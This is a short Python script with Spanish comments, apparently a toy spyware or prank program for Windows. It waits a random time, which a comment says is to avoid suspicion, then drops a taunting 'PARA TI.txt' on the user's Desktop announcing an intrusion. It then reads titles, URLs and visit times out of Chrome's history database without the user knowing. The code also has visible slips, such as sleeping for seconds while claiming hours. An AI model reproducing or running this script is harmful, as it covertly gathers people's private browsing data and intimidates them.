import os
import sqlite3
from time import sleep
from random import randrange
HFILENAME= "PARA TI.txt"
def delay_action():
    n_hours = randrange(1,4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours)

def create_hacker_file(user_path):
    hacker_file = open(user_path+"\\Desktop\\" + HFILENAME, "w")
    hacker_file.write("Hola, soy un dibujo de la beba army xd y me colado en tu sistema.")
    return hacker_file
def get_chrome_history(user_path):
    try:
        history_path = user_path+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor=connection.cursor()
        cursor.execute("SELECT title ,last_visit_time, url FROM  urls ORDER BY last_visit_time ASC")
        urls= cursor.fetchall()
        print(urls)
        connection.close()
        return urls
    except sqlite3.OperationalError:
        return None

def main():
    # esperaremos entre 1 y 3 horas para no levantar sospechas xd
    delay_action()
    #calculamos la ruta del usuario de windows
    user_path = "C:\\Users\\"+os.getlogin()
    #creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    #recogemos su historial de googlechrome
    chrome_histoy=get_chrome_history(user_path)
if __name__=="__main__":
    main()